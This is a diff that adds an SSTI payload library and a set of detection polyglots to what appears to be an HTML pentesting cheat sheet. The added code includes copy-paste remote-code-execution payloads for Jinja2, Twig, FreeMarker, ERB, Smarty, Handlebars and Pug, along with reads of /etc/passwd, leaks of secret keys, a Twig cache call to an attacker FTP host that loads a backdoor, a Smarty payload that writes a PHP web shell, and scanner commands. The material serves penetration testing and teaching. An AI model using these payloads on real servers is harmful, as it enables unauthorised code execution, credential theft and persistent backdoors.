@@ -233,6 +233,101 @@ python3 tplmap.py -u 'http://target.com/profile?bio=hello*world'</code></pre>
 # Bypass dot notation with brackets:
 {{ ''['__class__']['__mro__'][1]['__subclasses__']() }}</code></pre>
 
+  <h2>SSTI Payload Library by Engine</h2>
+  <p>Quick reference payloads from PayloadsAllTheThings — one-liners per engine for copy-paste use.</p>
+
+  <pre><code># Jinja2 (Python/Flask) — RCE via __subclasses__:
+{{ ''.__class__.__mro__[1].__subclasses__()[408]('id',shell=True,stdout=-1).communicate()[0].strip() }}
+{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
+{{ config.SECRET_KEY }}
+
+# Jinja2 via request object (Flask):
+{{ request['__class__']['__mro__'][1]['__subclasses__']()[40]('/etc/passwd').read() }}
+
+# Twig (PHP) — file read and SSRF:
+{{ source('/etc/passwd') }}
+{{ '/etc/passwd'|file_excerpt(1,30) }}
+{{ _self.env.setCache("ftp://attacker.net:2121") }}{{ _self.env.loadTemplate("backdoor") }}
+
+# FreeMarker (Java) — RCE:
+&lt;#assign command="freemarker.template.utility.Execute"?new()&gt;${ command("id") }
+&lt;#assign command="freemarker.template.utility.Execute"?new()&gt;${ command("cat /etc/passwd") }
+
+# Velocity (Java) — RCE:
+#set($ex="freemarker.template.utility.Execute"?new())
+$ex.exec(["id"])
+
+# Thymeleaf (Java/Spring) — SpEL injection:
+__$%7bnew+java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).useDelimiter("\\A").next()%7d__::.x
+
+# ERB (Ruby) — RCE:
+&lt;%= system("id") %&gt;
+&lt;%= `id` %&gt;
+&lt;%= File.open('/etc/passwd').read %&gt;
+
+# Smarty (PHP) — RCE (&lt;3.1.30):
+{php}echo `id`;{/php}
+{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"&lt;?php passthru($_GET['cmd']); ?&gt;",self::clearConfig())}
+
+# Handlebars (Node.js) — sandbox escape RCE:
+{{#with "s" as |string|}}
+  {{#with "e"}}
+    {{#with split as |conslist|}}
+      {{this.pop}}
+      {{this.push (lookup string.sub "constructor")}}
+      {{this.pop}}
+      {{#with string.split as |codelist|}}
+        {{this.pop}}
+        {{this.push "return require('child_process').exec('id');"}}
+        {{this.pop}}
+        {{#each conslist}}
+          {{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}
+        {{/each}}
+      {{/with}}
+    {{/with}}
+  {{/with}}
+{{/with}}
+
+# Pug/Jade (Node.js) — RCE:
+- global.process.mainModule.require('child_process').execSync('id').toString()
+#{global.process.mainModule.require('child_process').execSync('id').toString()}</code></pre>
+
+  <h2>SSTI Detection Polyglots</h2>
+  <p>Universal detection payloads from PayloadsAllTheThings to identify engine type without prior knowledge.</p>
+
+  <pre><code># Polyglot to trigger error in all major engines simultaneously:
+${{&lt;%[%'"}}%\.
+
+# Mathematical expression probe (rendered = SSTI confirmed):
+{{7*7}}     → 49  (Jinja2, Twig)
+${7*7}      → 49  (FreeMarker, Velocity, Groovy)
+#{7*7}      → 49  (Thymeleaf, Pug)
+&lt;%= 7*7 %&gt; → 49  (ERB)
+{7*7}       → 49  (Smarty)
+
+# Error-based detection (look at error message to identify engine):
+{{(1/0).zxy.zxy}}   -- triggers verbose error
+
+# Engine identification from error messages:
+# ZeroDivisionError           → Python (Jinja2)
+# java.lang.ArithmeticException → Java (FreeMarker/Velocity)
+# ReferenceError / TypeError  → Node.js (Handlebars/Pug)
+# Division by zero            → PHP (Twig/Smarty)
+# divided by 0                → Ruby (ERB)
+# Arithmetic operation failed → FreeMarker
+
+# Boolean-Based blind detection:
+# Pair 1 (true):  {{8*8}} → 64 rendered
+# Pair 2 (false): {{8*'8'}} → 7777777 (Jinja2) or 64 (Twig) — differentiates engines
+
+# Automated scanning with TInjA:
+tinja url -u "http://example.com/?name=Kirlia" -H "Authorization: Bearer TOKEN"
+tinja url -u "http://example.com/" -d "username=Kirlia"
+
+# SSTImap (interactive exploitation):
+python3 sstimap.py -u 'https://target/?name=John' -s
+python3 sstimap.py -i -A -m POST -l 5 -H 'Authorization: Basic BASE64'</code></pre>
+
   <h2>Resources</h2>
   <ul>
     <li>tplmap — SSTI exploitation tool — <code>github.com/epinna/tplmap</code></li>
